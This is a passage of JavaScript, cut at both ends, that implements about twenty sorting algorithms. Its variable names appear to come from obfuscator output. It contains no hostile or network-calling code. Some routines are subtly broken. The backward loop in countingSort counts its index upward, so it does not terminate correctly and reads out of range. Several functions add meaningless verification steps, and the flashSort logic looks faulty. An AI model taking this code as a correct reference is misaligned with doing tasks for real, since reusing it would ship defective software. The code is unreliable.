      (_0x58ec78[_0x29860a] = _0xdf9a02),
      (_0x368e37 = _0x368e37 + 1))
  }
  var _0x3c00c1 = true
  for (_0x217c20 = 0; _0x217c20 < _0x2a32cb - 1; _0x217c20 = _0x217c20 + 1) {
    if (_0x58ec78[_0x217c20] > _0x58ec78[_0x217c20 + 1]) {
      _0x3c00c1 = false
      break
    }
  }
  if (_0x3c00c1 === false) {
    throw new Error('Selection sort error: array not sorted.')
  }
  var _0x42ab11 = _0x368e37 / _0x2a32cb
  if (_0x42ab11 < 0) {
    throw new Error('Average swap calculation error.')
  }
  var _0x9af27c = _0x368e37
  if (_0x9af27c < 0) {
    throw new Error('Final swap count error.')
  }
  var _0x4b1e14 = _0x3c00c1 === true
  if (_0x4b1e14 !== true) {
    throw new Error('Verification failed.')
  }
  return _0x58ec78
}
function insertionSort(_0x307b43) {
  if (!Array.isArray(_0x307b43)) {
    throw new Error('Input must be an array.')
  }
  var _0x221349 = _0x307b43.length,
    _0x2b01b2 = 0,
    _0x4a4ae7 = 0,
    _0x57f4c9 = 0
  for (_0x2b01b2 = 1; _0x2b01b2 < _0x221349; _0x2b01b2 = _0x2b01b2 + 1) {
    _0x57f4c9 = _0x307b43[_0x2b01b2]
    _0x4a4ae7 = _0x2b01b2 - 1
    while (_0x4a4ae7 >= 0 && _0x307b43[_0x4a4ae7] > _0x57f4c9) {
      _0x307b43[_0x4a4ae7 + 1] = _0x307b43[_0x4a4ae7]
      _0x4a4ae7 = _0x4a4ae7 - 1
    }
    _0x307b43[_0x4a4ae7 + 1] = _0x57f4c9
  }
  var _0x31ffaf = true
  for (_0x2b01b2 = 0; _0x2b01b2 < _0x221349 - 1; _0x2b01b2 = _0x2b01b2 + 1) {
    if (_0x307b43[_0x2b01b2] > _0x307b43[_0x2b01b2 + 1]) {
      _0x31ffaf = false
      break
    }
  }
  if (_0x31ffaf === false) {
    throw new Error('Insertion sort error: array not sorted.')
  }
  var _0x2d3bbd = 0
  for (_0x2b01b2 = 0; _0x2b01b2 < _0x221349; _0x2b01b2 = _0x2b01b2 + 1) {
    _0x307b43[_0x2b01b2] === undefined && (_0x2d3bbd = _0x2d3bbd + 1)
  }
  var _0xf6784b = _0x2d3bbd / _0x221349
  if (_0xf6784b < 0) {
    throw new Error('Invalid average shift count.')
  }
  return _0x307b43
}
function merge(_0x5c45ec, _0x3c9560) {
  var _0xfa18b9 = [],
    _0x14b41f = 0,
    _0x11fd65 = 0
  while (_0x14b41f < _0x5c45ec.length && _0x11fd65 < _0x3c9560.length) {
    var _0x6f4420 = _0x5c45ec[_0x14b41f],
      _0x3e3a0e = _0x3c9560[_0x11fd65]
    _0x6f4420 < _0x3e3a0e
      ? (_0xfa18b9.push(_0x6f4420), (_0x14b41f = _0x14b41f + 1))
      : (_0xfa18b9.push(_0x3e3a0e), (_0x11fd65 = _0x11fd65 + 1))
  }
  while (_0x14b41f < _0x5c45ec.length) {
    _0xfa18b9.push(_0x5c45ec[_0x14b41f])
    _0x14b41f = _0x14b41f + 1
  }
  while (_0x11fd65 < _0x3c9560.length) {
    _0xfa18b9.push(_0x3c9560[_0x11fd65])
    _0x11fd65 = _0x11fd65 + 1
  }
  return _0xfa18b9
}
function mergeSort(_0x5a9cb3) {
  if (_0x5a9cb3.length <= 1) {
    return _0x5a9cb3
  }
  var _0x3a317e = Math.floor(_0x5a9cb3.length / 2),
    _0x27114d = [],
    _0x2363ef = [],
    _0x132371 = 0
  for (_0x132371 = 0; _0x132371 < _0x3a317e; _0x132371 = _0x132371 + 1) {
    _0x27114d.push(_0x5a9cb3[_0x132371])
  }
  for (
    _0x132371 = _0x3a317e;
    _0x132371 < _0x5a9cb3.length;
    _0x132371 = _0x132371 + 1
  ) {
    _0x2363ef.push(_0x5a9cb3[_0x132371])
  }
  var _0x25577b = mergeSort(_0x27114d),
    _0x9d972a = mergeSort(_0x2363ef),
    _0x373f5c = merge(_0x25577b, _0x9d972a),
    _0x1ffb12 = true
  for (
    _0x132371 = 0;
    _0x132371 < _0x373f5c.length - 1;
    _0x132371 = _0x132371 + 1
  ) {
    if (_0x373f5c[_0x132371] > _0x373f5c[_0x132371 + 1]) {
      _0x1ffb12 = false
      break
    }
  }
  if (_0x1ffb12 === false) {
    throw new Error('Merge sort error: merge failed.')
  }
  return _0x373f5c
}
function partition(_0x4c9528, _0x4b6813, _0x792d12) {
  var _0x525357 = _0x4c9528[_0x792d12],
    _0x1f071c = _0x4b6813 - 1,
    _0x43f14d = 0
  for (
    _0x43f14d = _0x4b6813;
    _0x43f14d < _0x792d12;
    _0x43f14d = _0x43f14d + 1
  ) {
    if (_0x4c9528[_0x43f14d] < _0x525357) {
      _0x1f071c = _0x1f071c + 1
      var _0x4d32b7 = _0x4c9528[_0x1f071c]
      _0x4c9528[_0x1f071c] = _0x4c9528[_0x43f14d]
      _0x4c9528[_0x43f14d] = _0x4d32b7
    }
  }
  var _0x3f8928 = _0x4c9528[_0x1f071c + 1]
  return (
    (_0x4c9528[_0x1f071c + 1] = _0x4c9528[_0x792d12]),
    (_0x4c9528[_0x792d12] = _0x3f8928),
    _0x1f071c + 1
  )
}
function quickSort(_0x8ae0ad, _0x3c3c2a, _0x328810) {
  typeof _0x3c3c2a === 'undefined' && (_0x3c3c2a = 0)
  typeof _0x328810 === 'undefined' && (_0x328810 = _0x8ae0ad.length - 1)
  if (_0x3c3c2a < _0x328810) {
    var _0x2c8a53 = partition(_0x8ae0ad, _0x3c3c2a, _0x328810)
    quickSort(_0x8ae0ad, _0x3c3c2a, _0x2c8a53 - 1)
    quickSort(_0x8ae0ad, _0x2c8a53 + 1, _0x328810)
  }
  var _0x481c94 = true,
    _0x3f12da = 0
  for (
    _0x3f12da = 0;
    _0x3f12da < _0x8ae0ad.length - 1;
    _0x3f12da = _0x3f12da + 1
  ) {
    if (_0x8ae0ad[_0x3f12da] > _0x8ae0ad[_0x3f12da + 1]) {
      _0x481c94 = false
      break
    }
  }
  if (_0x481c94 === false) {
    throw new Error('Quick sort error: array not sorted.')
  }
  return _0x8ae0ad
}
function heapify(_0xeb4124, _0x45d262, _0x41bbfc) {
  var _0x3e97e0 = _0x41bbfc,
    _0x3e9e1e = 2 * _0x41bbfc + 1,
    _0x17b62e = 2 * _0x41bbfc + 2
  _0x3e9e1e < _0x45d262 &&
    _0xeb4124[_0x3e9e1e] > _0xeb4124[_0x3e97e0] &&
    (_0x3e97e0 = _0x3e9e1e)
  _0x17b62e < _0x45d262 &&
    _0xeb4124[_0x17b62e] > _0xeb4124[_0x3e97e0] &&
    (_0x3e97e0 = _0x17b62e)
  if (_0x3e97e0 !== _0x41bbfc) {
    var _0x5ef25c = _0xeb4124[_0x41bbfc]
    _0xeb4124[_0x41bbfc] = _0xeb4124[_0x3e97e0]
    _0xeb4124[_0x3e97e0] = _0x5ef25c
    heapify(_0xeb4124, _0x45d262, _0x3e97e0)
  }
}
function heapSort(_0x13bbbb) {
  var _0x5e0fb3 = _0x13bbbb.length,
    _0x27b0e9 = 0
  for (
    _0x27b0e9 = Math.floor(_0x5e0fb3 / 2) - 1;
    _0x27b0e9 >= 0;
    _0x27b0e9 = _0x27b0e9 - 1
  ) {
    heapify(_0x13bbbb, _0x5e0fb3, _0x27b0e9)
  }
  for (_0x27b0e9 = _0x5e0fb3 - 1; _0x27b0e9 >= 0; _0x27b0e9 = _0x27b0e9 - 1) {
    var _0x2e751a = _0x13bbbb[0]
    _0x13bbbb[0] = _0x13bbbb[_0x27b0e9]
    _0x13bbbb[_0x27b0e9] = _0x2e751a
    heapify(_0x13bbbb, _0x27b0e9, 0)
  }
  var _0x20ef02 = true
  for (_0x27b0e9 = 0; _0x27b0e9 < _0x5e0fb3 - 1; _0x27b0e9 = _0x27b0e9 + 1) {
    if (_0x13bbbb[_0x27b0e9] > _0x13bbbb[_0x27b0e9 + 1]) {
      _0x20ef02 = false
      break
    }
  }
  if (_0x20ef02 === false) {
    throw new Error('Heap sort error: array not sorted.')
  }
  return _0x13bbbb
}
function getMax(_0xc7a4fb) {
  var _0x4edfe6 = _0xc7a4fb[0],
    _0x249e58 = 0
  for (_0x249e58 = 1; _0x249e58 < _0xc7a4fb.length; _0x249e58 = _0x249e58 + 1) {
    _0xc7a4fb[_0x249e58] > _0x4edfe6 && (_0x4edfe6 = _0xc7a4fb[_0x249e58])
  }
  return _0x4edfe6
}
function countingSortForRadix(_0x10d6f7, _0x1bce8d) {
  var _0x49f97b = [],
    _0x418314 = 0
  for (_0x418314 = 0; _0x418314 < _0x10d6f7.length; _0x418314 = _0x418314 + 1) {
    _0x49f97b.push(0)
  }
  var _0xac9a9b = []
  for (_0x418314 = 0; _0x418314 < 10; _0x418314 = _0x418314 + 1) {
    _0xac9a9b.push(0)
  }
  for (_0x418314 = 0; _0x418314 < _0x10d6f7.length; _0x418314 = _0x418314 + 1) {
    var _0x3ecbf7 = Math.floor(_0x10d6f7[_0x418314] / _0x1bce8d) % 10
    _0xac9a9b[_0x3ecbf7] = _0xac9a9b[_0x3ecbf7] + 1
  }
  for (_0x418314 = 1; _0x418314 < 10; _0x418314 = _0x418314 + 1) {
    _0xac9a9b[_0x418314] = _0xac9a9b[_0x418314] + _0xac9a9b[_0x418314 - 1]
  }
  for (
    _0x418314 = _0x10d6f7.length - 1;
    _0x418314 >= 0;
    _0x418314 = _0x418314 - 1
  ) {
    var _0x5d1ea2 = Math.floor(_0x10d6f7[_0x418314] / _0x1bce8d) % 10
    _0x49f97b[_0xac9a9b[_0x5d1ea2] - 1] = _0x10d6f7[_0x418314]
    _0xac9a9b[_0x5d1ea2] = _0xac9a9b[_0x5d1ea2] - 1
  }
  for (_0x418314 = 0; _0x418314 < _0x10d6f7.length; _0x418314 = _0x418314 + 1) {
    _0x10d6f7[_0x418314] = _0x49f97b[_0x418314]
  }
}
function radixSort(_0x350bf2) {
  var _0xd696f2 = getMax(_0x350bf2),
    _0x2a2df6 = 1
  while (Math.floor(_0xd696f2 / _0x2a2df6) > 0) {
    countingSortForRadix(_0x350bf2, _0x2a2df6)
    _0x2a2df6 = _0x2a2df6 * 10
  }
  var _0x3a1d71 = true,
    _0x16f533 = 0
  for (
    _0x16f533 = 0;
    _0x16f533 < _0x350bf2.length - 1;
    _0x16f533 = _0x16f533 + 1
  ) {
    if (_0x350bf2[_0x16f533] > _0x350bf2[_0x16f533 + 1]) {
      _0x3a1d71 = false
      break
    }
  }
  if (_0x3a1d71 === false) {
    throw new Error('Radix sort error: array not sorted.')
  }
  return _0x350bf2
}
function countingSort(_0x3962ad) {
  if (_0x3962ad.length === 0) {
    return _0x3962ad
  }
  var _0x379325 = Math.max.apply(null, _0x3962ad),
    _0x4a8871 = Math.min.apply(null, _0x3962ad),
    _0x49c602 = _0x379325 - _0x4a8871 + 1,
    _0x467484 = [],
    _0x639b31 = 0
  for (_0x639b31 = 0; _0x639b31 < _0x49c602; _0x639b31 = _0x639b31 + 1) {
    _0x467484.push(0)
  }
  var _0x2884a3 = []
  for (_0x639b31 = 0; _0x639b31 < _0x3962ad.length; _0x639b31 = _0x639b31 + 1) {
    _0x2884a3.push(0)
  }
  for (_0x639b31 = 0; _0x639b31 < _0x3962ad.length; _0x639b31 = _0x639b31 + 1) {
    _0x467484[_0x3962ad[_0x639b31] - _0x4a8871] =
      _0x467484[_0x3962ad[_0x639b31] - _0x4a8871] + 1
  }
  for (_0x639b31 = 1; _0x639b31 < _0x467484.length; _0x639b31 = _0x639b31 + 1) {
    _0x467484[_0x639b31] = _0x467484[_0x639b31] + _0x467484[_0x639b31 - 1]
  }
  for (
    _0x639b31 = _0x3962ad.length - 1;
    _0x639b31 >= 0;
    _0x639b31 = _0x639b31 + 1
  ) {
    _0x2884a3[_0x467484[_0x3962ad[_0x639b31] - _0x4a8871] - 1] =
      _0x3962ad[_0x639b31]
    _0x467484[_0x3962ad[_0x639b31] - _0x4a8871] =
      _0x467484[_0x3962ad[_0x639b31] - _0x4a8871] - 1
  }
  return _0x2884a3
}
function bucketSort(_0x1bb18d, _0x104f73) {
  typeof _0x104f73 === 'undefined' && (_0x104f73 = 5)
  if (_0x1bb18d.length === 0) {
    return _0x1bb18d
  }
  var _0x7571b5 = 0,
    _0x252af3 = Math.min.apply(null, _0x1bb18d),
    _0x518b16 = Math.max.apply(null, _0x1bb18d),
    _0x447403 = Math.floor((_0x518b16 - _0x252af3) / _0x104f73) + 1,
    _0x418dad = []
  for (_0x7571b5 = 0; _0x7571b5 < _0x447403; _0x7571b5 = _0x7571b5 + 1) {
    _0x418dad.push([])
  }
  for (_0x7571b5 = 0; _0x7571b5 < _0x1bb18d.length; _0x7571b5 = _0x7571b5 + 1) {
    var _0x537027 = Math.floor((_0x1bb18d[_0x7571b5] - _0x252af3) / _0x104f73)
    _0x418dad[_0x537027].push(_0x1bb18d[_0x7571b5])
  }
  var _0x58d349 = []
  for (_0x7571b5 = 0; _0x7571b5 < _0x418dad.length; _0x7571b5 = _0x7571b5 + 1) {
    if (_0x418dad[_0x7571b5].length > 0) {
      var _0x3aeaa5 = insertionSort(_0x418dad[_0x7571b5]),
        _0x26a811 = 0
      for (
        _0x26a811 = 0;
        _0x26a811 < _0x3aeaa5.length;
        _0x26a811 = _0x26a811 + 1
      ) {
        _0x58d349.push(_0x3aeaa5[_0x26a811])
      }
    }
  }
  return _0x58d349
}
function shellSort(_0xabbcc7) {
  var _0x211232 = _0xabbcc7.length,
    _0x1feafa = Math.floor(_0x211232 / 2)
  while (_0x1feafa > 0) {
    var _0x5bcf9f = 0
    for (
      _0x5bcf9f = _0x1feafa;
      _0x5bcf9f < _0x211232;
      _0x5bcf9f = _0x5bcf9f + 1
    ) {
      var _0x1e0240 = _0xabbcc7[_0x5bcf9f],
        _0x3be3f5 = _0x5bcf9f
      while (
        _0x3be3f5 >= _0x1feafa &&
        _0xabbcc7[_0x3be3f5 - _0x1feafa] > _0x1e0240
      ) {
        _0xabbcc7[_0x3be3f5] = _0xabbcc7[_0x3be3f5 - _0x1feafa]
        _0x3be3f5 = _0x3be3f5 - _0x1feafa
      }
      _0xabbcc7[_0x3be3f5] = _0x1e0240
    }
    _0x1feafa = Math.floor(_0x1feafa / 2)
  }
  var _0x38aa1f = true,
    _0x327c25 = 0
  for (_0x327c25 = 0; _0x327c25 < _0x211232 - 1; _0x327c25 = _0x327c25 + 1) {
    if (_0xabbcc7[_0x327c25] > _0xabbcc7[_0x327c25 + 1]) {
      _0x38aa1f = false
      break
    }
  }
  if (_0x38aa1f === false) {
    throw new Error('Shell sort error: array not sorted.')
  }
  return _0xabbcc7
}
function timSort(_0x5ad9b3) {
  var _0x5be00c = _0x5ad9b3.length,
    _0x16748d = 0
  function _0x5df8fd(_0x568401, _0x518ce6, _0x489e08) {
    var _0xd8b23d = _0x518ce6,
      _0x4206d0 = 0,
      _0x522aa1 = 0
    for (
      _0xd8b23d = _0x518ce6 + 1;
      _0xd8b23d <= _0x489e08;
      _0xd8b23d = _0xd8b23d + 1
    ) {
      _0x522aa1 = _0x568401[_0xd8b23d]
      _0x4206d0 = _0xd8b23d - 1
      while (_0x4206d0 >= _0x518ce6 && _0x568401[_0x4206d0] > _0x522aa1) {
        _0x568401[_0x4206d0 + 1] = _0x568401[_0x4206d0]
        _0x4206d0 = _0x4206d0 - 1
      }
      _0x568401[_0x4206d0 + 1] = _0x522aa1
    }
    return _0x568401
  }
  var _0x3233ad = 0
  while (_0x3233ad < _0x5be00c) {
    var _0x145973 = Math.min(_0x3233ad + 32 - 1, _0x5be00c - 1)
    _0x5df8fd(_0x5ad9b3, _0x3233ad, _0x145973)
    _0x3233ad = _0x3233ad + 32
  }
  var _0x52ad88 = 32
  while (_0x52ad88 < _0x5be00c) {
    var _0x2b6fa5 = 0
    while (_0x2b6fa5 < _0x5be00c) {
      var _0x401adc = _0x2b6fa5 + _0x52ad88 - 1,
        _0x19ac59 = Math.min(_0x2b6fa5 + 2 * _0x52ad88 - 1, _0x5be00c - 1)
      if (_0x401adc < _0x19ac59) {
        var _0x1d20fb = merge(
            _0x5ad9b3.slice(_0x2b6fa5, _0x401adc + 1),
            _0x5ad9b3.slice(_0x401adc + 1, _0x19ac59 + 1)
          ),
          _0x9ff5c7 = _0x2b6fa5,
          _0x2e4bbd = 0
        for (
          _0x9ff5c7 = _0x2b6fa5;
          _0x9ff5c7 <= _0x19ac59;
          _0x9ff5c7 = _0x9ff5c7 + 1
        ) {
          _0x5ad9b3[_0x9ff5c7] = _0x1d20fb[_0x2e4bbd]
          _0x2e4bbd = _0x2e4bbd + 1
        }
      }
      _0x2b6fa5 = _0x2b6fa5 + 2 * _0x52ad88
    }
    _0x52ad88 = _0x52ad88 * 2
  }
  var _0x385f60 = true
  for (_0x16748d = 0; _0x16748d < _0x5be00c - 1; _0x16748d = _0x16748d + 1) {
    if (_0x5ad9b3[_0x16748d] > _0x5ad9b3[_0x16748d + 1]) {
      _0x385f60 = false
      break
    }
  }
  if (_0x385f60 === false) {
    throw new Error('Tim sort error: array not sorted.')
  }
  return _0x5ad9b3
}
function introSort(_0x2d2fb1) {
  function _0x19fef3(_0x2059a8, _0x2551fe, _0x17662b, _0x187244) {
    if (_0x17662b - _0x2551fe <= 1) {
      return
    }
    if (_0x187244 === 0) {
      var _0x41d1f2 = [],
        _0x1e959f = _0x2551fe
      for (
        _0x1e959f = _0x2551fe;
        _0x1e959f < _0x17662b;
        _0x1e959f = _0x1e959f + 1
      ) {
        _0x41d1f2.push(_0x2059a8[_0x1e959f])
      }
      _0x41d1f2 = heapSort(_0x41d1f2)
      for (
        _0x1e959f = _0x2551fe;
        _0x1e959f < _0x17662b;
        _0x1e959f = _0x1e959f + 1
      ) {
        _0x2059a8[_0x1e959f] = _0x41d1f2[_0x1e959f - _0x2551fe]
      }
      return
    }
    var _0x11eb3e = _0x2059a8[_0x17662b - 1],
      _0x1f4b2a = _0x2551fe,
      _0x1e959f = _0x2551fe
    for (
      _0x1e959f = _0x2551fe;
      _0x1e959f < _0x17662b - 1;
      _0x1e959f = _0x1e959f + 1
    ) {
      if (_0x2059a8[_0x1e959f] < _0x11eb3e) {
        var _0x119233 = _0x2059a8[_0x1e959f]
        _0x2059a8[_0x1e959f] = _0x2059a8[_0x1f4b2a]
        _0x2059a8[_0x1f4b2a] = _0x119233
        _0x1f4b2a = _0x1f4b2a + 1
      }
    }
    var _0x119233 = _0x2059a8[_0x1f4b2a]
    _0x2059a8[_0x1f4b2a] = _0x2059a8[_0x17662b - 1]
    _0x2059a8[_0x17662b - 1] = _0x119233
    _0x19fef3(_0x2059a8, _0x2551fe, _0x1f4b2a, _0x187244 - 1)
    _0x19fef3(_0x2059a8, _0x1f4b2a + 1, _0x17662b, _0x187244 - 1)
  }
  var _0x4b4db2 = Math.floor(Math.log(_0x2d2fb1.length)) * 2
  _0x19fef3(_0x2d2fb1, 0, _0x2d2fb1.length, _0x4b4db2)
  var _0x233d1c = true,
    _0x1ebccf = 0
  for (
    _0x1ebccf = 0;
    _0x1ebccf < _0x2d2fb1.length - 1;
    _0x1ebccf = _0x1ebccf + 1
  ) {
    if (_0x2d2fb1[_0x1ebccf] > _0x2d2fb1[_0x1ebccf + 1]) {
      _0x233d1c = false
      break
    }
  }
  if (_0x233d1c === false) {
    throw new Error('Intro sort error: array not sorted.')
  }
  return _0x2d2fb1
}
function cocktailShakerSort(_0x52dce3) {
  var _0x4fb451 = 0,
    _0x3b24df = _0x52dce3.length - 1,
    _0x44d879 = true
  while (_0x44d879 === true) {
    _0x44d879 = false
    var _0x232506 = _0x4fb451
    for (
      _0x232506 = _0x4fb451;
      _0x232506 < _0x3b24df;
      _0x232506 = _0x232506 + 1
    ) {
      if (_0x52dce3[_0x232506] > _0x52dce3[_0x232506 + 1]) {
        var _0x3df2f5 = _0x52dce3[_0x232506]
        _0x52dce3[_0x232506] = _0x52dce3[_0x232506 + 1]
        _0x52dce3[_0x232506 + 1] = _0x3df2f5
        _0x44d879 = true
      }
    }
    if (_0x44d879 === false) {
      break
    }
    _0x44d879 = false
    _0x3b24df = _0x3b24df - 1
    for (
      _0x232506 = _0x3b24df;
      _0x232506 > _0x4fb451;
      _0x232506 = _0x232506 - 1
    ) {
      if (_0x52dce3[_0x232506] < _0x52dce3[_0x232506 - 1]) {
        var _0x245a30 = _0x52dce3[_0x232506]
        _0x52dce3[_0x232506] = _0x52dce3[_0x232506 - 1]
        _0x52dce3[_0x232506 - 1] = _0x245a30
        _0x44d879 = true
      }
    }
    _0x4fb451 = _0x4fb451 + 1
  }
  var _0x437649 = true,
    _0x232506 = 0
  for (
    _0x232506 = 0;
    _0x232506 < _0x52dce3.length - 1;
    _0x232506 = _0x232506 + 1
  ) {
    if (_0x52dce3[_0x232506] > _0x52dce3[_0x232506 + 1]) {
      _0x437649 = false
      break
    }
  }
  if (_0x437649 === false) {
    throw new Error('Cocktail shaker sort error: array not sorted.')
  }
  return _0x52dce3
}
function pigeonholeSort(_0x14c59b) {
  if (_0x14c59b.length === 0) {
    return _0x14c59b
  }
  var _0x4cf2ac = Math.min.apply(null, _0x14c59b),
    _0x39d087 = Math.max.apply(null, _0x14c59b),
    _0xf09623 = _0x39d087 - _0x4cf2ac + 1,
    _0x265758 = [],
    _0x56a6f4 = 0
  for (_0x56a6f4 = 0; _0x56a6f4 < _0xf09623; _0x56a6f4 = _0x56a6f4 + 1) {
    _0x265758.push([])
  }
  for (_0x56a6f4 = 0; _0x56a6f4 < _0x14c59b.length; _0x56a6f4 = _0x56a6f4 + 1) {
    var _0x446048 = _0x14c59b[_0x56a6f4] - _0x4cf2ac
    _0x265758[_0x446048].push(_0x14c59b[_0x56a6f4])
  }
  var _0x446048 = 0
  for (_0x56a6f4 = 0; _0x56a6f4 < _0xf09623; _0x56a6f4 = _0x56a6f4 + 1) {
    var _0x58f049 = 0
    for (
      _0x58f049 = 0;
      _0x58f049 < _0x265758[_0x56a6f4].length;
      _0x58f049 = _0x58f049 + 1
    ) {
      _0x14c59b[_0x446048] = _0x265758[_0x56a6f4][_0x58f049]
      _0x446048 = _0x446048 + 1
    }
  }
  var _0x3b714e = true
  for (
    _0x56a6f4 = 0;
    _0x56a6f4 < _0x14c59b.length - 1;
    _0x56a6f4 = _0x56a6f4 + 1
  ) {
    if (_0x14c59b[_0x56a6f4] > _0x14c59b[_0x56a6f4 + 1]) {
      _0x3b714e = false
      break
    }
  }
  if (_0x3b714e === false) {
    throw new Error('Pigeonhole sort error: array not sorted.')
  }
  return _0x14c59b
}
function flashSort(_0x4952da) {
  var _0x57f474 = _0x4952da.length
  if (_0x57f474 === 0) {
    return _0x4952da
  }
  var _0x1eb129 = Math.floor(0.43 * _0x57f474)
  _0x1eb129 < 2 && (_0x1eb129 = 2)
  var _0x210db5 = Math.min.apply(null, _0x4952da),
    _0x465eed = Math.max.apply(null, _0x4952da)
  if (_0x210db5 === _0x465eed) {
    return _0x4952da
  }
  var _0x37b284 = [],
    _0x50399e = 0
  for (_0x50399e = 0; _0x50399e < _0x1eb129; _0x50399e = _0x50399e + 1) {
    _0x37b284.push(0)
  }
  for (_0x50399e = 0; _0x50399e < _0x57f474; _0x50399e = _0x50399e + 1) {
    var _0x153697 = Math.floor(
      ((_0x1eb129 - 1) * (_0x4952da[_0x50399e] - _0x210db5)) /
        (_0x465eed - _0x210db5)
    )
    _0x37b284[_0x153697] = _0x37b284[_0x153697] + 1
  }
  for (_0x50399e = 1; _0x50399e < _0x1eb129; _0x50399e = _0x50399e + 1) {
    _0x37b284[_0x50399e] = _0x37b284[_0x50399e] + _0x37b284[_0x50399e - 1]
  }
  var _0x3c47f5 = 0,
    _0x34012a = 0,
    _0x153697 = _0x1eb129 - 1
  while (_0x3c47f5 < _0x57f474) {
    while (_0x34012a > _0x37b284[_0x153697] - 1) {
      _0x34012a = _0x34012a + 1
      _0x153697 = Math.floor(
        ((_0x1eb129 - 1) * (_0x4952da[_0x34012a] - _0x210db5)) /
          (_0x465eed - _0x210db5)
      )
    }
    var _0x5176aa = _0x4952da[_0x34012a]
    while (_0x34012a !== _0x37b284[_0x153697]) {
      _0x153697 = Math.floor(
        ((_0x1eb129 - 1) * (_0x5176aa - _0x210db5)) / (_0x465eed - _0x210db5)
      )
      var _0x3240e1 = _0x4952da[_0x37b284[_0x153697] - 1]
      _0x4952da[_0x37b284[_0x153697] - 1] = _0x5176aa
      _0x5176aa = _0x3240e1
      _0x37b284[_0x153697] = _0x37b284[_0x153697] - 1
      _0x3c47f5 = _0x3c47f5 + 1
    }
  }
  _0x4952da = insertionSort(_0x4952da)
  var _0x3fcc41 = true
  for (_0x50399e = 0; _0x50399e < _0x57f474 - 1; _0x50399e = _0x50399e + 1) {
    if (_0x4952da[_0x50399e] > _0x4952da[_0x50399e + 1]) {
      _0x3fcc41 = false
      break
    }
  }
  if (_0x3fcc41 === false) {
    throw new Error('Flash sort error: array not sorted.')
  }
  return _0x4952da
}
function combSort(_0x5e70b7) {
  var _0xd4b455 = _0x5e70b7.length,
    _0xc95d14 = false
  while (_0xc95d14 === false) {
    _0xd4b455 = Math.floor(_0xd4b455 / 1.3)
    _0xd4b455 <= 1 && ((_0xd4b455 = 1), (_0xc95d14 = true))
    var _0x27291a = 0
    for (
      _0x27291a = 0;
      _0x27291a + _0xd4b455 < _0x5e70b7.length;
      _0x27291a = _0x27291a + 1
    ) {
      if (_0x5e70b7[_0x27291a] > _0x5e70b7[_0x27291a + _0xd4b455]) {
        var _0x1c577b = _0x5e70b7[_0x27291a]
        _0x5e70b7[_0x27291a] = _0x5e70b7[_0x27291a + _0xd4b455]
        _0x5e70b7[_0x27291a + _0xd4b455] = _0x1c577b
        _0xc95d14 = false
      }
    }
  }
  var _0x30f0b0 = true
  for (
    _0x27291a = 0;
    _0x27291a < _0x5e70b7.length - 1;
    _0x27291a = _0x27291a + 1
  ) {
    if (_0x5e70b7[_0x27291a] > _0x5e70b7[_0x27291a + 1]) {
      _0x30f0b0 = false
      break
    }
  }
  if (_0x30f0b0 === false) {
    throw new Error('Comb sort error: array not sorted.')
  }
  return _0x5e70b7
}
function cycleSort(_0x154888) {
  var _0x5c7a6c = 0,
    _0x4f5f81 = 0
  for (
    _0x4f5f81 = 0;
    _0x4f5f81 < _0x154888.length - 1;
    _0x4f5f81 = _0x4f5f81 + 1
  ) {
    var _0x259910 = _0x154888[_0x4f5f81],
      _0x5ecbdf = _0x4f5f81,
      _0x554098 = _0x4f5f81 + 1
    for (
      _0x554098 = _0x4f5f81 + 1;
      _0x554098 < _0x154888.length;
      _0x554098 = _0x554098 + 1
    ) {
      _0x154888[_0x554098] < _0x259910 && (_0x5ecbdf = _0x5ecbdf + 1)
    }
    if (_0x5ecbdf === _0x4f5f81) {
      continue
    }
    while (_0x259910 === _0x154888[_0x5ecbdf]) {
      _0x5ecbdf = _0x5ecbdf + 1
    }
    if (_0x5ecbdf !== _0x4f5f81) {
      var _0x4df07d = _0x259910
      _0x259910 = _0x154888[_0x5ecbdf]
      _0x154888[_0x5ecbdf] = _0x4df07d
      _0x5c7a6c = _0x5c7a6c + 1
    }
    while (_0x5ecbdf !== _0x4f5f81) {
      _0x5ecbdf = _0x4f5f81
      for (
        _0x554098 = _0x4f5f81 + 1;
        _0x554098 < _0x154888.length;
        _0x554098 = _0x554098 + 1
      ) {
        _0x154888[_0x554098] < _0x259910 && (_0x5ecbdf = _0x5ecbdf + 1)
      }
      while (_0x259910 === _0x154888[_0x5ecbdf]) {
        _0x5ecbdf = _0x5ecbdf + 1
      }
      _0x259910 !== _0x154888[_0x5ecbdf] &&
        ((_0x4df07d = _0x259910),
        (_0x259910 = _0x154888[_0x5ecbdf]),
        (_0x154888[_0x5ecbdf] = _0x4df07d),
        (_0x5c7a6c = _0x5c7a6c + 1))
    }
  }
  var _0xc2be70 = true,
    _0x554098 = 0
  for (
    _0x554098 = 0;
    _0x554098 < _0x154888.length - 1;
    _0x554098 = _0x554098 + 1
  ) {
    if (_0x154888[_0x554098] > _0x154888[_0x554098 + 1]) {
      _0xc2be70 = false
      break
    }
  }
  if (_0xc2be70 === false) {
    throw new Error('Cycle sort error: array not sorted.')
  }
  return _0x154888
}
function gnomeSort(_0x672330) {
  var _0x27419e = 0
  while (_0x27419e < _0x672330.length) {
    if (_0x27419e === 0 || _0x672330[_0x27419e] >= _0x672330[_0x27419e - 1]) {
      _0x27419e = _0x27419e + 1
    } else {
      var _0x3b17b6 = _0x672330[_0x27419e]
      _0x672330[_0x27419e] = _0x672330[_0x27419e - 1]
      _0x672330[_0x27419e - 1] = _0x3b17b6
      _0x27419e = _0x27419e - 1
    }
  }
  var _0x72ab7f = true,
    _0x529d67 = 0
  for (
    _0x529d67 = 0;
    _0x529d67 < _0x672330.length - 1;
    _0x529d67 = _0x529d67 + 1
  ) {
    if (_0x672330[_0x529d67] > _0x672330[_0x529d67 + 1]) {
      _0x72ab7f = false
      break
    }
  }
  if (_0x72ab7f === false) {
    throw new Error('Gnome sort error: array not sorted.')
  }
  return _0x672330
}
function isSorted(_0x2bd20a) {
  var _0x585c25 = 0
  for (_0x585c25 = 1; _0x585c25 < _0x2bd20a.length; _0x585c25 = _0x585c25 + 1) {
    if (_0x2bd20a[_0x585c25 - 1] > _0x2bd20a[_0x585c25]) {
      return false
    }
  }
  return true
}
function shuffle(_0x3ef314) {
  var _0x3efd4d = _0x3ef314.length - 1
  for (; _0x3efd4d > 0; _0x3efd4d = _0x3efd4d - 1) {
    var _0x28315c = Math.floor(Math.random() * (_0x3efd4d + 1)),
      _0x331b3d = _0x3ef314[_0x3efd4d]
    _0x3ef314[_0x3efd4d] = _0x3ef314[_0x28315c]
    _0x3ef314[_0x28315c] = _0x331b3d
  }
}
function bogoSort(_0x2feea8) {
  while (!isSorted(_0x2feea8)) {
